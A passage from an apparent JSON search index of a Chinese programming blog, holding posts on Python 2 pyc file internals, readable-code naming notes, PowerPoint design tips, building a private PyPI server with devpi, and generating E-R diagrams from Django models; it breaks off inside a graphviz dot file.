pyc 文件 需要知道的是，直接执行 py 源代码文件，并不会自动生成 pyc 文件。\n单文件编译：\n1 2 import py_compile py_compile.compile(r\u0026#39;./your.py\u0026#39;) 文件夹编译：\n1 2 import compileall compileall.compile_dir(\u0026#39;./\u0026#39;) pyc 是由 py 源代码文件经过编译后生成的，一种跨平台的二进制字节码文件。Python 解释器能解释执行 pyc 文件，类似于 Java 虚拟机。同时，pyc 的内容与 Python 的版本相关，不同版本的 Python 解释器，编译 py 源代码后生成的 pyc 文件不同。Python 2.7 编译生成的 pyc，Python 3.5 是无法执行的。\n如果跨版本执行 pyc，可能会报错（这里说可能，是因为小版本之间的 magic number 相同，可以执行）：\n1 RuntimeError: Bad magic number in .pyc file 在下面的内容中，还会有进一步的解释。\n3. import 实现的源码 Python 中 import 会生成 pyc 文件，下面从 Python 源码中 import 实现部分开始分析。\n源码位置：Python\\import.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* Load a source module from a given file and return its module */ /* object WITH INCREMENTED REFERENCE COUNT. If there\u0026#39;s a matching */ /* byte-compiled file, use that instead. */ static PyObject * load_source_module(char *name, char *pathname, FILE *fp) { if (check_compiled_module(pathname, mtime, cpathname))) { co = read_compiled_module(cpathname, fpc); } else { write_compiled_module(co, cpathname, \u0026amp;st, mtime); } m = PyImport_ExecCodeModuleEx(name, (PyObject *)co, pathname); } Python 执行 import 指令时，在代码目录下查找同名，后缀为 pyw、pyo、pyc 的文件。如果找到，则调用 check_compiled_module 函数，判断 pyc 文件中，头部的时间戳，是否与 py 文件 最后修改时间 一致。如果一致则，直接加载；否则重新编译生成 pyc 文件，并将 最后修改时间 写入 py 源码。\n如果没找到，则编译生成 pyc 文件。下面是 check_compiled_module 的源码。\n源码位置：Python\\import.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /* Given a pathname for a Python source file, its time of last */ /* modification, and a pathname for a compiled file, check whether the */ /* compiled file represents the same version of the source. If so, */ /* return a FILE pointer for the compiled file, positioned just after */ /* the header; if not, return NULL. */ /* Doesn\u0026#39;t set an exception. */ static FILE * check_compiled_module(char *pathname, time_t mtime, char *cpathname) { ... pyc_mtime = PyMarshal_ReadLongFromFile(fp); if (pyc_mtime != mtime) { if (Py_VerboseFlag) PySys_WriteStderr(\u0026#34;# %s has bad mtime\\n\u0026#34;, cpathname); fclose(fp); return NULL; } ... } check_compiled_module 函数是通过检查 py 和 pyc 文件的最后修改的时间戳 mtime 是否一致，来判断是否需要更新 pyc 文件。\n源码位置：Python\\import.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /* Write a compiled module to a file, placing the time of last*/ /* modification of its source into the header.*/ /* Errors are ignored, if a write error occurs an attempt is made to*/ /* remove the file. */ static void write_compiled_module(PyCodeObject *co, char *cpathname, struct stat *srcstat, time_t mtime) { ... PyMarshal_WriteLongToFile(pyc_magic, fp, Py_MARSHAL_VERSION); /* First write a 0 for mtime */ PyMarshal_WriteLongToFile(0L, fp, Py_MARSHAL_VERSION); PyMarshal_WriteObjectToFile((PyObject *)co, fp, Py_MARSHAL_VERSION); ... /* Now write the true mtime (as a 32-bit field) */ fseek(fp, 4L, 0); assert(mtime \u0026lt;= 0xFFFFFFFF); PyMarshal_WriteLongToFile((long)mtime, fp, Py_MARSHAL_VERSION); fflush(fp); fclose(fp); ... } 在写入 pyc 文件时，还需要写入一个 Long 型变量，变量的内容则是 py 源文件的最后修改时间戳 ftLastWriteTime。\n4. 不同版本的 pyc 如何区分 前面提到，不同 Python 版本的解释器生成的 pyc 文件不一样。那么，Python 解释器是如何加以区分的呢？\n在上面生成 pyc 文件的源码中，可以看到 PyMarshal_WriteLongToFile(pyc_magic, fp, Py_MARSHAL_VERSION); 将 pyc_magic 和 Py_MARSHAL_VERSION 变量写入 pyc 文件。Py_MARSHAL_VERSION 指定了当前的文件格式，2.7.8 版本为 2，3.5.5 版本为 4；pyc_magic 指定了和 Python 解释器相关的版本信息。\n源码位置：Python\\import.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /* Magic word to reject .pyc files generated by other Python versions. It should change for each incompatible change to the bytecode. Known values: ... Python 2.6a0: 62151 (peephole optimizations and STORE_MAP opcode) Python 2.6a1: 62161 (WITH_CLEANUP optimization) Python 2.7a0: 62171 (optimize list comprehensions/change LIST_APPEND) Python 2.7a0: 62181 (optimize conditional branches: introduce POP_JUMP_IF_FALSE and POP_JUMP_IF_TRUE) Python 2.7a0 62191 (introduce SETUP_WITH) Python 2.7a0 62201 (introduce BUILD_SET) Python 2.7a0 62211 (introduce MAP_ADD and SET_ADD) */ #define MAGIC (62211 | ((long)\u0026#39;\\r\u0026#39;\u0026lt;\u0026lt;16) | ((long)\u0026#39;\\n\u0026#39;\u0026lt;\u0026lt;24)) static long pyc_magic = MAGIC; 可以看到，在不同的 Python 解释器版本中 pyc_magic 值不同。通过定义新的 pyc_magic 可以用于生成专属的 Python 解释器，这也是实现 pyc 文件和指定 Python 解释器绑定的一种方式。\n5. PyCodeObject \u0026amp; PyFrameObject PyCodeObject 是 Python 源代码编译后，真正生成的结果。也就是说，编写的 Python 源代码都会被转换成 PyCodeObject 对象。\n源码位置： Include\\code.h\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /* Bytecode object */ typedef struct { PyObject_HEAD int co_argcount;\t/* #arguments, except *args */ int co_nlocals;\t/* #local variables */ int co_stacksize;\t/* #entries needed for evaluation stack */ int co_flags;\t/* CO_..., see below */ PyObject *co_code;\t/* instruction opcodes */ PyObject *co_consts;\t/* list (constants used) */ PyObject *co_names;\t/* list of strings (names used) */ PyObject *co_varnames;\t/* tuple of strings (local variable names) */ PyObject *co_freevars;\t/* tuple of strings (free variable names) */ PyObject *co_cellvars; /* tuple of strings (cell variable names) */ /* The rest doesn\u0026#39;t count for hash/cmp */ PyObject *co_filename;\t/* string (where it was loaded from) */ PyObject *co_name;\t/* string (name, for reference) */ int co_firstlineno;\t/* first source line number */ PyObject *co_lnotab;\t/* string (encoding addr\u0026lt;-\u0026gt;lineno mapping) See Objects/lnotab_notes.txt for details. */ void *co_zombieframe; /* for optimization only (see frameobject.c) */ PyObject *co_weakreflist; /* to support weakrefs to code objects */ } PyCodeObject; 在 PyCodeObjec 对象的 co_code 中保存着字节码指令。Python 解释器，执行字节码指令序列的过程就是，从头到尾遍历整个 co_code 依次执行字节码指令的过程。\n源码位置：Python\\marshal.c\n1 2 3 4 5 6 7 8 9 10 11 12 void PyMarshal_WriteObjectToFile(PyObject *x, FILE *fp, int version) { WFILE wf; wf.fp = fp; wf.error = WFERR_OK; wf.depth = 0; wf.strings = (version \u0026gt; 0) ? PyDict_New() : NULL; wf.version = version; w_object(x, \u0026amp;wf); Py_XDECREF(wf.strings); } PyMarshal_WriteObjectToFile 写入 PyCodeObject 对象到 pyc 文件，函数内部调用 w_object 将 Python 代码中出现的对象和对应的 TYPE_* 标识一一存入对象，比如int对象对应标识 TYPE_INT。\n但是，Python 程序在运行时，它的解释器上处理的并不是一个 PyCodeObject对象，而是与之对应的帧栈对象 PyFrameObject。\n源码位置：Include\\frameobject.h 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 typedef struct _frame { PyObject_VAR_HEAD struct _frame *f_back;\t/* previous frame, or NULL */ PyCodeObject *f_code;\t/* code segment */ PyObject *f_builtins;\t/* builtin symbol table (PyDictObject) */ PyObject *f_globals;\t/* global symbol table (PyDictObject) */ PyObject *f_locals;\t/* local symbol table (any mapping) */ PyObject **f_valuestack;\t/* points after the last local */ PyObject **f_stacktop; PyObject *f_trace;\t/* Trace function */ PyObject *f_exc_type, *f_exc_value, *f_exc_traceback; PyThreadState *f_tstate; int f_lasti;\t/* Last instruction if called */ int f_lineno;\t/* Current line number */ int f_iblock;\t/* index in f_blockstack */ PyTryBlock f_blockstack[CO_MAXBLOCKS]; /* for try and loop blocks */ PyObject *f_localsplus[1];\t/* locals+stack, dynamically sized */ } PyFrameObject; Python 解释器，用 PyInterpreterState 结构维护进程运行环境，PyThreadState 维护线程运行环境，PyFrameObject 维护栈帧运行环境，三者是依次包含关系，如下图所示：\nPython 解释器，动态加载上述三种结构进内存，并模拟操作系统执行过程。程序执行后，先创建各个运行时环境，再将栈帧中的字节码载入，循环遍历解释执行。\n6. 参考 http://www.sund.site/2016/01/25/2016-01-25/ ","description":"","id":467,"section":"post","tags":["博文","Python","源码","编译","学习"],"title":"Python2 源码学习之 pyc","uri":"https://www.chenshaowen.com/blog/python2-source-of-pyc.html"},{"content":"1. 关于名字 选择专业的词 避免泛泛的名字 用具体的名字代替抽象的名字 使用前缀或后缀给名字附带更多的信息 决定名字的长度 利用名字的格式来表达含义 2. 把信息装到名字里 通常来讲，加上像 is、has、can 或 should 这样的词，可以把布尔值变得更明确。\nget 开头的方法，习惯被当做轻量级访问器，只是简单地返回一个内部成员变量。如果违背这个习惯，可能会误导用户。i\n包名、模块名、局部变量名、函数名 全小写+下划线式驼峰\neg: this_is_var\n全局变量 全大写+下划线式驼峰\neg：GLOBAL_VAR\n类名 首字母大写式驼峰\n示例：ClassName()\n","description":"","id":468,"section":"post","tags":["博文","规范"],"title":"编写可阅读代码的艺术读书笔记","uri":"https://www.chenshaowen.com/blog/notes-on-the-art-of-writing-readable-code.html"},{"content":"1. 概况 课程前置条件：已经完成 PowerPoint 逻辑梳理和内容撰写。\n课程主要从以下六个部分，来增强 PowerPoint 的表现力：\n色彩 文字 图形 图表 母版 动画 2. 色彩 2.1 认识色彩 色相 彩色，如紫色、青色、品红等。中性色，如黑、白、灰。\n亮度 色彩的明暗程度，亮度值越高，色彩越白，亮度越低，色彩越黑。\n对比度 是画面黑与白的比值，比值越大，从黑到白的渐变层次。比值越大，从黑到白的渐变层次就越多，从而色彩表现越丰富。\n色温 色温是光线的色彩偏向。色温数值越低越偏向红色（愈暖），数值越高侧越偏向蓝色（愈冷）。\n饱和度 色彩的纯度，饱和度越高色彩越纯越浓，饱和度越低则色彩变灰变淡。\n色环 实质上就是在彩色光谱中所见的长条形的色彩序列,只是将首尾连接在一起，使红色连接到另一端的紫色。色环通常包括 12 种不同的颜色。\n色调 在一定的色相和明度的光源色的照射下，物体表面笼罩在一种统一的色彩倾向和色彩氛围之中，这种统一的氛围就是色调。\n2.2 色彩搭配 可以借助一定的工具，Adobe color-wheel。\n单色环 + 中性色 色环上 90 度范围选色 补色，色环上180度对立颜色 分离补色，先找到对立颜色，在90度范围找另外两颜色，共三色搭配 原色搭配，红黄蓝 2.3 PowerPoint 配色步骤 1，定基色 一个\n主要视觉定位的一种颜色，一般利用标志色或喜欢的颜色\n2，找配色 一个\n主要用来突出强调重点的内容，一般为基色的分离补色（90-160度范围）\n3，同色系 三个\n主要用来丰富颜色层次，一般为类比色/同色（0-30度范围）\n4，中性色 三个\n一般内容和大部分面积利用中性色填充，一般为黑、白、灰\n配色技巧：\n用好基色，多用中性色，少用配色 基色是主要的颜色，用在刀刃上 大量使用中性色，尤其是文字 配色仅在强调的时候使用 色相不多于 3 个 颜色不够用？巧用同色系调和 3. 文字 字体 在投影屏幕上应当多用无衬线体，黑体、微软雅黑等，看得清楚，字体没有装饰。艺术字样式谨慎使用\n大小 PPT 字体大小不要小于 16号字体\n文字属性 文字也可以设置背景图片来增强表现力\n文字排版原则\n亲密性（相关内容聚合在一起，组成视觉单元，无关视觉单元要区分开） 对齐（同一视觉单元尽量使用同一种对齐方式，避免使用居中对齐） 重复（保持一致的字体、间距，增加视觉的统一性） 对比（强调作用，少而精） Tips：（1）如果有图片，图片尽量在左边，文字在右边。因为，人眼视觉会先看图片，从左至右，从上而下看。（2）一页 PPT，内容点不超过 3 个或 5 个。\n强调内容\n建议：加大加粗，减少换行，变色反衬，适当动画。 不建议：下划线，斜体，阴影，过分动画 4. 图形 圆形 矩形 三角形 多边形 线形 图形组合：圆形+三角形 图形组合：矩形+三角形 图形组合：矩形+圆形 图形组合：圆形+线形 一张图片等于 1000 个文字，提炼关键字后，寻找有趣、有创意、能烘托主题的高清图，是一个不错的选择。\n下面是一些图床：\n全景 图研所 华盖创意 infogr 花瓣 图说 数读 呢图网 搜狐新闻数字之道 iconfont 最后，还需要掌握 PowerPoint 中的一些修图技巧。\n5. 图表 图表设计分为三步：\n第一步，生成图表\n通过数据，生成基础图表，并微调细节\n第二步，图表美化\n精炼图表要素，将无用的要素去掉，让图表信息更清晰\n第三步，图表强调\n变色强调 关键数据与普通数据区分开 使用动画效果强调关键数据 利用图片，结合场景突出呈现 下面是一些图表的展示效果：\n还有一些手工绘制图表的技巧，利用一些基础的 PowerPoint 图形组合成自己需要的图标形式。\n6. 母版 通常母版只需要确定好，每个页面都具有的顶部和底部样式，标题样式，字体样式即可。每个页面具体的排版，需要根据内容调整。\n7. 动画 需要把握使用动画的度，不要喧宾夺主。学习 PowerPoint 动画制作的一些技巧。\n8. 参考 PPT素材 ","description":"","id":469,"section":"post","tags":["整理","PPT","工具"],"title":"PPT 制作攻略之呈现篇课程笔记","uri":"https://www.chenshaowen.com/blog/notes-on-making-strategy-of-the-presentation.html"},{"content":" 使用 pip 命令安装 Python 包时，默认去 https://pypi.python.org/simple/ 源查找相应的包，下载并安装。但是在内网环境，或者需要发布一些私有包提供给指定用户时，就需要搭建自己的 PyPI Server。本篇主要记录使用 devpi 工具搭建 PyPI Server 源的过程，以及记录一些常用命令。\n1. PyPI Server 比较 PyPI Server PyPI 代理镜像 本地缓存 单元测试 系统测试 搜索 devpi 支持 支持 ★★★★ ★★★★★ 支持 Web + XML RPC DjangoPyPI 支持 不支持 ★ 无 支持 Web + XML RPC chishop 不支持 不支持 无 无 不支持 pypiserver 支持 不支持 ★★★★★ 无 不支持 Cheese Shop 不支持 不支持 ★★ 无 支持 Web + XML RPC localshop 支持 支持 ★★★★ 无 只支持 XML RPC mypypi 不支持 不支持 ★★ 无 不支持 proxypypi 支持 支持 无 无 不支持 Flask-Pypi-Proxy 支持 支持 无 无 不支持 2. devpi 特有的功能 2.1 索引继承 pypiserver 等只支持两个索引： 私有的索引和公有的索引。 在私有索引上找不到 Python 包时， 就会去公有索引上找。 devpi 对这一功能做了扩展， devpi 可以支持多个索引。同时，新索引可以继承之前的索引，这在维护多版本系统上十分有用。\n2.2 支持集群部署 支持一台或多台服务器部署，来加速访问。还支持通过 json 接口，实时监控集群的状态。\n2.3 支持导入导出功能 支持导出服务器状态，并在必要时重新导回服务器，恢复服务器状态。\n2.4 Jenkins 集成 支持给索引设置 Jenkins 触发器，可以使用 tox 自动测试上传的包。\n3. 搭建 devpi server devpi 包含三个组件：\ndevpi-server，是 devpi server 核心组件，提供镜像与缓存功能 devpi-web，提供 Web 界面与查询功能 devpi-client，命令行工具, 提供包上传等与服务器交互的功能 3.1 安装 devpi 1 pip install devpi 3.2 启动 devpi server 服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 [chenshaowen@localhost ~]devpi quickstart --\u0026gt; /home/chenshaowendevpi-server --version --\u0026gt; /home/chenshaowendevpi-server --start --init ... --\u0026gt; /home/chenshaowendevpi index -c dev http://localhost:3141/chenshaowen/dev: type=stage bases= volatile=True acl_upload=chenshaowen acl_toxresult_upload=:ANONYMOUS: mirror_whitelist= pypi_whitelist= --\u0026gt; /home/chenshaowendevpi use dev current devpi index: http://localhost:3141/chenshaowen/dev (logged in as chenshaowen) /home/chenshaowen/.pip/pip.conf: no config file exists ~/.pydistutils.cfg : no config file exists ~/.buildout/default.cfg: no config file exists always-set-cfg: no COMPLETED! you can now work with your \u0026#39;dev\u0026#39; index devpi install PKG # install a pkg from pypi devpi upload # upload a setup.py based project devpi test PKG # download and test a tox-based project devpi PUSH ... # to copy releases between indexes devpi index ... # to manipulate/create indexes devpi use ... # to change current index devpi user ... # to manipulate/create users devpi CMD -h # help for a specific command devpi -h # general help docs at http://doc.devpi.net 通过 http://localhost:3141 访问页面：\n可以看到新建了两个索引，一个是 root 的，一个是当前操作用户的。通过命令，可以查看索引信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 devpi getjson /root { \u0026#34;result\u0026#34;: { \u0026#34;indexes\u0026#34;: { \u0026#34;pypi\u0026#34;: { \u0026#34;mirror_url\u0026#34;: \u0026#34;https://pypi.python.org/simple/\u0026#34;, \u0026#34;mirror_web_url_fmt\u0026#34;: \u0026#34;https://pypi.python.org/pypi/{name}\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;PyPI\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;mirror\u0026#34;, \u0026#34;volatile\u0026#34;: false } }, \u0026#34;username\u0026#34;: \u0026#34;root\u0026#34; }, \u0026#34;type\u0026#34;: \u0026#34;userconfig\u0026#34; } 由于 root 的索引配置了 mirror_url ，相当于在本地建立了一个附加的 Pypi 源， https://pypi.python.org/simple/。\n另外一个索引 chenshaowen/dev，则仅能通过上传来新增包。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 devpi getjson /chenshaowen { \u0026#34;result\u0026#34;: { \u0026#34;indexes\u0026#34;: { \u0026#34;dev\u0026#34;: { \u0026#34;acl_toxresult_upload\u0026#34;: [ \u0026#34;:ANONYMOUS:\u0026#34; ], \u0026#34;acl_upload\u0026#34;: [ \u0026#34;chenshaowen\u0026#34; ], \u0026#34;bases\u0026#34;: [], \u0026#34;mirror_whitelist\u0026#34;: [], \u0026#34;pypi_whitelist\u0026#34;: [], \u0026#34;type\u0026#34;: \u0026#34;stage\u0026#34;, \u0026#34;volatile\u0026#34;: true } }, \u0026#34;username\u0026#34;: \u0026#34;chenshaowen\u0026#34; }, \u0026#34;type\u0026#34;: \u0026#34;userconfig\u0026#34; } 常用 devpi-server 服务端操作命令：\n1 2 3 4 5 devpi-server --init devpi-server --start devpi-server --stop devpi-server --status devpi-server --log 3.3 基本 devpi client 操作 devpi 是通过 client 与 devpi server 进行交互配置的。下面是一些基本的交互操作命令：\ndevpi login root \u0026ndash;password，登陆，首次启动密码为空 devpi user -m root password=123，修改密码 devpi logoff，退出登陆 devpi user -c myuser password=mypassword email=myemail@example.com，创建新用户 devpi login myuser \u0026ndash;password=mypassword devpi index -c dev bases=root/pypi 创建索引 devpi use chenshaowen/dev，使用索引 devpi upload ，上传包，需要在 setup.py 所在目录下执行 devpi upload \u0026ndash;with-docs，上传包，支持 sphinx 创建的文档，需要 docs 目录和 setup.py 在同个目录下 devpi index myuser/dev mirror_url = \u0026ldquo;https://pypi.doubanio.com/simple/\u0026quot; ， 当仓库中不存在包时，从豆瓣下载包缓存到本地（默认是从官方源 https://pypi.python.org/simple/ 下载） devpi push，将包从一个索引推送到另外一个索引 通过 devpi 命令可以新建索引，对索引中的包和权限进行管理，具体操作步骤可以参考官方文档。\n4. 客户端配置 在服务器上运行 devpi server 之后，还需要通过 Nginx 反向代理对外提供服务。具体配置可以参考官方文档。这里以 Nginx 已经配置了 devpi.example.com 域名为例：\n本地新建 ~/.pip/pip.conf 文件，内容如下：\n1 2 3 4 5 [global] timeout = 60 index-url = http://devpi.example.com/root/pypi/+simple/ [install] trusted-host = devpi.example.com 这样就将 pip 默认的安装源指向了 devpi server。\n5. 参考 https://devpi.net/docs/devpi/devpi/latest/+d/quickstart-releaseprocess.html http://note.qidong.name/2017/08/local-pypi-services/ https://yijingping.github.io/2013/07/25/setting-up-your-own-pypi-server.html http://wing2south.com/post/devpi-best-private-pypi-server/ ","description":"","id":470,"section":"post","tags":["博文","Python","工具"],"title":"如何使用 devpi 搭建 PyPI Server","uri":"https://www.chenshaowen.com/blog/how-to-build-a-pypi-server-using-devpi.html"},{"content":" 在需求逐步确认的过程中，系统的 DB 模型也逐步确认。有时使用，MySQL Workbench 这类工具绘制 E-R 图，然后生成 MySQL 数据库表，这时就需要反向生成 Django Models；有时直接写 Django Models ，但是又需要查看 E-R 图。本文主要解决上面两个需求，实现 Django Models 与 E-R 图之间的转换。\n1. 生成 model 的关系图 Django 提供第三方包 django-extensions，可以用来将 Django 中的 Models 生成 E-R 图。\n1.1 安装包 1 pip install django-extensions 1.2 配置 在 Django settings.py 文件， INSTALLED_APPS 中添加 django_extensions。\n1 2 3 INSTALLED_APPS = ( \u0026#39;django_extensions\u0026#39;, ) 1.3 生成 dot 文件和 png 图片 生成全部 model 的 E-R 图 1 python manage.py graph_models -a \u0026gt; all.dot 单独某个 Django App （以 django_view_permission 为例） 生成 dot 文件。 1 python manage.py graph_models django_view_permission \u0026gt; django_view_permission.dot 导出的 dot 内容如下：\ndjango_view_permission.dot\ndigraph model_graph { // Dotfile by Django-Extensions graph_models // Created: 2018-03-03 14:55 // Cli Options: django_view_permission fontname = \u0026#34;Helvetica\u0026#34; fontsize = 8 splines = true node [ fontname = \u0026#34;Helvetica\u0026#34; fontsize = 8 shape = \u0026#34;plaintext\u0026#34; ] edge [ fontname = \u0026#34;Helvetica\u0026#34; fontsize = 8 ] // Labels django_view_permission_models_CommonElement [label=\u0026lt; \u0026lt;TABLE BGCOLOR=\u0026#34;palegoldenrod\u0026#34; BORDER=\u0026#34;0\u0026#34; CELLBORDER=\u0026#34;0\u0026#34; CELLSPACING=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD COLSPAN=\u0026#34;2\u0026#34; CELLPADDING=\u0026#34;4\u0026#34; ALIGN=\u0026#34;CENTER\u0026#34; BGCOLOR=\u0026#34;olivedrab4\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34; COLOR=\u0026#34;white\u0026#34;\u0026gt; CommonElement \u0026lt;/FONT\u0026gt;\u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;create_time\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;DateTimeField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;doc\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;TextField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;update_time\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;DateTimeField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;/TABLE\u0026gt; \u0026gt;] django_view_permission_models_View [label=\u0026lt; \u0026lt;TABLE BGCOLOR=\u0026#34;palegoldenrod\u0026#34; BORDER=\u0026#34;0\u0026#34; CELLBORDER=\u0026#34;0\u0026#34; CELLSPACING=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD COLSPAN=\u0026#34;2\u0026#34; CELLPADDING=\u0026#34;4\u0026#34; ALIGN=\u0026#34;CENTER\u0026#34; BGCOLOR=\u0026#34;olivedrab4\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34; COLOR=\u0026#34;white\u0026#34;\u0026gt; View\u0026lt;BR/\u0026gt;\u0026amp;lt;\u0026lt;FONT FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;CommonElement\u0026lt;/FONT\u0026gt;\u0026amp;gt; \u0026lt;/FONT\u0026gt;\u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34;\u0026gt;id\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT FACE=\u0026#34;Helvetica Bold\u0026#34;\u0026gt;AutoField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;create_time\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;DateTimeField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;doc\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;TextField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;func\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;CharField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;module\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;CharField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;name\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica \u0026#34;\u0026gt;CharField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;TR\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34; BORDER=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;update_time\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;TD ALIGN=\u0026#34;LEFT\u0026#34;\u0026gt; \u0026lt;FONT COLOR=\u0026#34;#7B7B7B\u0026#34; FACE=\u0026#34;Helvetica Italic\u0026#34;\u0026gt;DateTimeField\u0026lt;/FONT\u0026gt; \u0026lt;/TD\u0026gt;\u0026lt;/TR\u0026gt; \u0026lt;/TABLE\u0026gt; \u0026gt;] django_view_permission_models_ViewSet [label=\u0026lt; \u0026lt;TABLE BGCOLOR=\u0026#34;palegoldenrod\u0026#34; BORDER=\u0026#34;0\u0026#34; 